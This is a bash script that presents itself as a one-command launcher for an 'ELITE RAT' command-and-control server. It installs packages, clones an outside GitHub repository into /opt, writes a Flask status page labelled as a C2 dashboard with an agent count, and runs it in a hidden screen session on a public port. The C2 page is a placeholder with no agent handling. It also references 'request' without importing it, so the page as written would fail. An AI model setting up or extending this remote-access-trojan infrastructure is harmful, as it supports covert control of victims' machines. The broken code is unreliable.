#!/bin/bash
# ELITE RAT - INSTANT LAUNCHER
# One command to get everything running

echo "🚀 ELITE RAT - INSTANT SETUP"
echo "============================"

# Install basics
apt-get update -qq
apt-get install -y python3 python3-pip python3-venv git screen -qq

# Clone repo
rm -rf /opt/elite_rat
git clone https://github.com/oranolio956/flipperflipper.git /opt/elite_rat

# Setup Python
cd /opt/elite_rat
python3 -m venv venv
source venv/bin/activate
pip install flask flask-cors -q

# Create simple but working server
cat > server.py << 'EOF'
from flask import Flask, render_template_string
app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <html>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
        h1 { font-size: 48px; text-shadow: 0 0 20px #0f0; animation: pulse 2s infinite; }
        @keyframes pulse { 0% {opacity: 1;} 50% {opacity: 0.5;} 100% {opacity: 1;} }
        .status { border: 2px solid #0f0; padding: 20px; display: inline-block; margin: 20px; }
    </style>
    <body>
        <h1>🔥 ELITE RAT C2 🔥</h1>
        <div class="status">
            <h2>✅ SYSTEM ONLINE</h2>
            <p>Server: ''' + str(request.host) + '''</p>
            <p>Status: OPERATIONAL</p>
            <p>Agents: 0 Connected</p>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF

# Kill anything on port 5000
kill $(lsof -t -i:5000) 2>/dev/null

# Launch in screen
screen -dmS elite python server.py

# Wait for startup
sleep 3

# Get IP
IP=$(curl -s ifconfig.me)

# Success message
echo ""
echo "✅ SUCCESS! Server is running!"
echo ""
echo "📱 Access your C2 at:"
echo "   http://$IP:5000"
echo ""
echo "🔧 Useful commands:"
echo "   View server: screen -r elite"
echo "   Detach: Ctrl+A then D"
echo "   Stop: screen -X -S elite quit"
echo ""